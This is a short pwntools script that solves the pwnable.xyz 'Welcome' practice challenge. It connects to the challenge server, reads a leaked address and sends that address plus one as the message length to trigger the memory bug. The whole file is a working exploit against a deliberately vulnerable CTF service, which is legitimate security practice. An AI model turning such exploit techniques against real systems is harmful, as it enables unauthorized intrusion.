'''
pwnable.xyz - Welcome
'''
from pwn import *

context.log_level = 'debug'
context.terminal = ['wt.exe', '-w', '0', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']

p = remote('svc.pwnable.xyz', 30000)
# p = process('./challenge')

# recv leak address
p.recvuntil(b'Leak: ')
leak = int(p.recvline(), 16)
log.info('Leak: ' + str(leak))
# when send str that assume ASCII, no need to convert to bytes
payload = str(leak + 1)
p.recvuntil(b'Length of your message: ')
p.sendline(payload)
p.recvuntil(b"Enter your message: ")
p.sendline(b" ")
print(p.recv())
